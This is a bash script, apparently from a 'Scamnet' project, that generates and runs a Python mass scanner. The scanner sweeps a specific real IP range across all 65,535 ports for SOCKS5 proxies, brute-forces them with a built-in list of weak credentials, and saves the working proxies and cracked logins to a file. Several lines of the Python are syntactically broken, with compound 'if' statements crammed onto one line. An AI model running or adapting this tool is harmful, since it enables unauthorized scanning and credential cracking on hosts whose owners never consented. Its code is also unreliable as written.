#!/bin/bash
# main.sh - Scamnet OTC SOCKS5 全端口扫描器（终极稳定版 v2.4）
# 功能：157.254.32.0-157.254.52.255 全端口 1-65535 扫描
# 修复：!range 解析 + 真实进度 + 防崩溃 + 自动 pip
# TG: @soqunla | GitHub: https://github.com/avotcorg/scamnet

set -e

# ==================== 颜色 & 日志 ====================
RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LOG="$LOG_DIR/scanner_$(date +%Y%m%d_%H%M%S).log"
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"; }

echo -e "${GREEN}[OTC] Scamnet 完整启动器 v2.4 (全端口 1-65535 - 终极稳定)${NC}"
echo "日志 → $LOG"

# ==================== 安装依赖（自动 pip + 清华源）================
if [ ! -f ".deps_installed" ]; then
    echo -e "${YELLOW}[*] 安装依赖（清华源）...${NC}"
    if ! command -v pip3 &>/dev/null; then
        echo -e "${RED}[!] pip3 未安装，尝试自动安装...${NC}"
        if command -v apt >/dev/null; then
            apt update -qq && apt install -y python3-pip >>"$LOG" 2>&1
        elif command -v yum >/dev/null; then
            yum install -y python3-pip >>"$LOG" 2>&1
        elif command -v apk >/dev/null; then
            apk add py3-pip >>"$LOG" 2>&1
        else
            echo -e "${RED}[!] 不支持的系统，无法自动安装 pip3${NC}"
            exit 1
        fi
    fi
    pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple \
        requests tqdm PyYAML ipaddress --no-warn-script-location 2>&1 | tee -a "$LOG"
    touch .deps_installed
    log "依赖安装完成"
else
    log "依赖已安装"
fi

# ==================== 创建 config.yaml（全端口）================
cat > config.yaml << 'EOF'
range: "157.254.32.0-157.254.52.255"
ports: !range 1-65535
timeout: 6.0
workers: 300
EOF
log "config.yaml 已创建（全端口 1-65535）"

# ==================== scanner.py（终极稳定版）================
cat > scanner.py << 'PY'
import sys, os; sys.path.append(os.path.dirname(__file__))
import yaml
from yaml import SafeLoader
from plugins import load_plugins
from concurrent.futures import ThreadPoolExecutor
import socket, ipaddress, threading, time
from tqdm import tqdm

# 注册 !range 构造器
def range_constructor(loader, node):
    value = loader.construct_scalar(node)
    start, end = map(int, value.split('-'))
    return list(range(start, end + 1))
yaml.add_constructor('!range', range_constructor, Loader=SafeLoader)

# 加载配置
with open('config.yaml') as f:
    cfg = yaml.load(f, Loader=SafeLoader)

INPUT_RANGE = cfg['range']
RAW_PORTS = cfg['ports']
TIMEOUT = cfg.get('timeout', 6.0)
MAX_WORKERS = cfg.get('workers', 300)

# 解析端口
if isinstance(RAW_PORTS, list):
    PORTS = RAW_PORTS
else:
    print(f"[!] 端口解析失败，使用默认 [1080]")
    PORTS = [1080]

print(f"[DEBUG] 端口数量: {len(PORTS)} (期望: 65535)")

# 全局
file_lock = threading.Lock()
valid_count = 0
progress_lock = threading.Lock()
plugins = load_plugins()

# 安全更新进度
def safe_update(pbar):
    with progress_lock:
        pbar.update(1)

# 核心测试函数（异常保护）
def test_proxy(ip: str, port: int, pbar):
    try:
        result = {'ip':ip, 'port':port, 'status':'FAIL', 'country':'XX', 'latency':'-', 'export_ip':'-', 'auth':''}
        ok, lat, exp = is_socks5_available(ip, port, None, None)
        if ok:
            c = get_country(exp) or get_country(ip)
            result.update({'status':'OK', 'country':c, 'latency':f'{lat}ms', 'export_ip':exp})
        else:
            auth_mod = plugins.get('auth_weak')
            if auth_mod:
                auth = auth_mod.brute(ip, port)
                if auth:
                    u, p = auth
                    ok, lat, exp = is_socks5_available(ip, port, u, p)
                    if ok:
                        c = get_country(exp) or get_country(ip)
                        result.update({'status':'OK (Weak)', 'country':c, 'latency':f'{lat}ms', 'export_ip':exp, 'auth':f'{u}:{p}'})
        plugins['output_file'].save_detail(result)
        if result['status'].startswith('OK'):
            with file_lock:
                global valid_count
                valid_count += 1
            plugins['output_file'].save_valid(result)
    except Exception as e:
        pass  # 忽略单个任务错误
    finally:
        safe_update(pbar)

def get_country(ip):
    try:
        for n in ['geo_ipapi']:
            if n in plugins and (c:=plugins[n].get(ip)): return c
    except: pass
    return 'XX'

def is_socks5_available(ip, port, u=None, p=None):
    try:
        with socket.create_connection((ip, port), timeout=TIMEOUT) as s:
            s.settimeout(TIMEOUT)
            m = b'\x05\x02\x00\x02' if u and p else b'\x05\x01\x00'
            s.sendall(m); r = s.recv(2)
            if len(r)!=2 or r[0]!=5: return False,0,None
            if r[1]==0: pass
            elif r[1]==2 and u and p:
                a = b'\x01'+bytes([len(u)])+u.encode()+bytes([len(p)])+p.encode()
                s.sendall(a); if s.recv(2)[1]!=0: return False,0,None
            else: return False,0,None
            t = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\x00\x50'
            s.sendall(b'\x05\x01\x00\x01'+t); if s.recv(10)[1]!=0: return False,0,None
            s.sendall(b'GET / HTTP/1.1\r\nHost: ifconfig.me\r\n\r\n')
            resp=b''; st=time.time()
            while time.time()-st<TIMEOUT:
                try: c=s.recv(1024); resp+=c; if b'\r\n\r\n' in resp: break
                except: break
            exp = resp.split(b'\r\n\r\n',1)[1].decode(errors='ignore').split()[0] if b'\r\n\r\n' in resp else 'Unknown'
            return True, round((time.time()-st)*1000), exp
    except: return False,0,None

def main():
    print('[OTC] 扫描启动')
    start_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[0]))
    end_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[1]))
    ips = [str(ipaddress.IPv4Address(i)) for i in range(start_ip, end_ip + 1)]
    total = len(ips) * len(PORTS)
    print(f'IP: {len(ips):,}, 端口: {len(PORTS):,}, 总任务: {total:,}')

    pbar = tqdm(total=total, desc='扫描', unit='port', ncols=100)

    def worker(ip, port):
        test_proxy(ip, port, pbar)

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as exe:
        for ip in ips:
            for port in PORTS:
                exe.submit(worker, ip, port)
        exe.shutdown(wait=True)  # 等待所有任务完成

    pbar.close()
    print(f'\n[+] 完成！发现 {valid_count} 个可用代理')

if __name__ == '__main__': main()
PY
log "scanner.py 已写入（终极稳定版）"

# ==================== 创建 plugins 目录 & 插件 ====================
mkdir -p plugins

cat > plugins/__init__.py << 'PY'
import importlib, os
def load_plugins():
    p = {}
    path = os.path.dirname(__file__)
    for f in os.listdir(path):
        if f.endswith('.py') and f != '__init__.py':
            n = f[:-3]
            p[n] = importlib.import_module(f'plugins.{n}')
    return p
PY

cat > plugins/auth_weak.py << 'PY'
WEAK_PASSWORDS = [
    "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
    "1234:1234", "admin:admin", "socks5:socks5", "123456:123456",
    "12345678:12345678", "admin123:admin", "proxy:proxy", "admin:123456", "root:root",
    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888",
    "test123:test123", "qwe:qwe", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
    "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
]
def brute(ip, port):
    from scanner import is_socks5_available, TIMEOUT
    for pair in WEAK_PASSWORDS:
        u, p = pair.split(':')
        ok, _, _ = is_socks5_available(ip, port, u, p)
        if ok: return u, p
    return None
PY

cat > plugins/geo_ipapi.py << 'PY'
import requests
def get(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=countryCode', timeout=6)
        if r.status_code == 200:
            c = r.json().get('countryCode','').strip().upper()
            if len(c) == 2 and c.isalpha():
                print(f'[GEO] {ip} → {c}')
                return c
    except: pass
    return None
PY

cat > plugins/output_file.py << 'PY'
import threading
file_lock = threading.Lock()
valid_count = 0
def save_detail(r):
    line = f'{r["ip"]}:{r["port"]} | {r["status"]} | {r["country"]} | {r["latency"]} | {r["export_ip"]} | {r["auth"]}'
    with file_lock:
        with open('result_detail.txt', 'a', encoding='utf-8') as f:
            f.write(line + '\n')
def save_valid(r):
    global valid_count
    valid_count += 1
    auth = r["auth"]
    fmt = f'socks5://{auth}@{r["ip"]}:{r["port"]}#{r["country"]}' if auth else f'socks5://{r["ip"]}:{r["port"]}#{r["country"]}'
    with file_lock:
        with open('socks5_valid.txt', 'a', encoding='utf-8') as f:
            f.write(fmt + '\n')
    print(f'[+] 发现 #{valid_count}: {fmt}')
PY

log "所有插件已创建"

# ==================== 初始化结果文件 ====================
echo "# Scamnet 扫描日志 $(date)" > result_detail.txt
echo "# socks5://user:pass@ip:port#CN" > socks5_valid.txt
log "结果文件初始化"

# ==================== 启动扫描 ====================
echo -e "${GREEN}[*] 启动扫描 (157.254.32.0-157.254.52.255, 全端口 1-65535)...${NC}"
python3 scanner.py 2>&1 | tee -a "$LOG"

# ==================== 完成报告 ====================
VALID=$(grep -c "^socks5://" socks5_valid.txt || echo 0)
echo -e "${GREEN}[+] 扫描完成！发现 ${VALID} 个可用 SOCKS5${NC}"
echo "   详细 → result_detail.txt"
echo "   有效 → socks5_valid.txt"
log "扫描结束: $VALID 个代理"
echo -e "${GREEN}[*] 全部完成！再次运行: ./main.sh${NC}"
